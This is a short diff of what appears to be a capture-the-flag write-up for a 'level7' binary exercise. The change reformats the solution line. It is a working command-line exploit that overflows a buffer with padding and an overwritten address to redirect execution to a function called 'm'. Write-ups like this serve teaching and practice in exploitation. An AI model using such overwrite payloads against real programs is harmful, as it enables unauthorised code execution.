@@ -34,4 +34,5 @@ x/x 0x08049928
 
 Now we simply need to overwrite this address with the address of the m function.
 
-exploit : ./level7 `python -c 'print "a"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
+Exploit:
+./level7 `python -c 'print "a"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
